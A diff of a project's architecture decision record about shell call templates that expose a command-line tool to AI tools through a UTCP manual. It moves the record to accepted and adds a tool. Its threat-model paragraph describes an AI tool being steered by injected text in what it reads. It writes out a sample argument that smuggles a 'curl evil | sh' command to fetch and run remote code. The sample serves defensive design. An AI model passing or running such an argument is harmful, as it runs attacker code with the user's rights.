@@ -1,5 +1,5 @@
 ---
-status: proposed
+status: accepted
 date: 2026-11-22
 ---
 
@@ -36,20 +36,23 @@ A rough draft of the manual, from the public UTCP pages, is in [utcp-manual.md](
 
 **Arguments are the risk that decides the design.** A tool argument is inserted into a line of shell. An AI tool can be steered, by text in the code or documents it reads, to send an argument such as `x"; curl evil | sh; echo "`. If the client inserts it as plain text, that runs as the user, and the rule that every command only reads (capability M3) holds for nothing. The explanation is in [utcp-manual.md](../utcp-manual.md#why-arguments-need-care).
 
-**Proposed, `TO_REFINE`:** quote every placeholder; allow-list every argument in the schema, with no `"`, `$`, backtick or `\`; make `workbench manual` refuse a template that breaks this; test it with a real shell; and try a real client once with an attack value before Release 1 ships (capability M8). If the client inserts values unchecked, the fallbacks are ids only, a local HTTP call template, a sandbox, or dropping the free-text tools. This ADR stays `proposed` until the client check is done.
+**Decided (capability M8):** the project owner accepts the assumption that a UTCP client checks each argument against the schema, or inserts it exactly as given, and this ADR is accepted on that assumption. A second guard stays: every placeholder is quoted, every argument is allow-listed in the schema with no `"`, `$`, backtick or `\`, `workbench manual` refuses a template that breaks this, and a test runs the templates with a real shell. If a client is ever found to insert values unchecked, the fallbacks are ids only, a local HTTP call template, a sandbox, or dropping the free-text tools.
 
 ## Decided
 
 - The command is `workbench manual`, and the folder `init` writes is `ops/`. Both names are agreed by the project owner.
 - With `--json`, a command that succeeds writes nothing to standard error, because the client captures the result with `2>&1`. A test covers every query command.
-- Every argument of a tool is required in its schema, with a default, and `*` means no filter, because a call template is a fixed line and cannot leave an argument out. `node` splits into `node` and `file`, so the manual has eleven tools. Flags that are only present or absent stay on the command line. The default values are drafts.
+- Every argument of a tool is required in its schema, with a default, and `*` means no filter, because a call template is a fixed line and cannot leave an argument out. `node` splits into `node` and `file`, and `impact --tests` is a tool of its own, `tests` (added 2026-11-23, [#14](https://github.com/Revanthshalon/semantic-workbench/issues/14)), so the manual has twelve tools. Flags that are only present or absent stay on the command line. The default values are drafts.
+
+## Amended
+
+[ADR 0024](./0024-claude-code-and-copilot-use-the-command-line-guided-by-a-skill.md): Claude Code and GitHub Copilot do not load UTCP manuals. In Release 1 they run `workbench` directly, guided by the `workbench` skill. The manual stays, for AI tools that speak UTCP, and the points below apply to it.
 
 ## Open points
 
 Step 8, Task 1 settles these before any code is written.
 
 - The exact UTCP version and manual fields: the draft uses what the examples show.
-- Whether a real client enforces the schema or inserts values faithfully, and whether standard error reaches the result as the pages say, whether an argument given at its default value is inserted as expected, and what happens to a call that runs past 120 seconds.
-- Whether a manual can carry anything for skills (K2). Proposed: the manual lists each skill with its file path and description, and the AI tool reads the file.
+- With a UTCP client: whether standard error reaches the result as the pages say, whether an argument given at its default value is inserted as expected, and what happens to a call that runs past 120 seconds.
 - Whether `rs-utcp` is worth a crate.
 - Whether `status` should say that the manual was written by an older version of `workbench`.
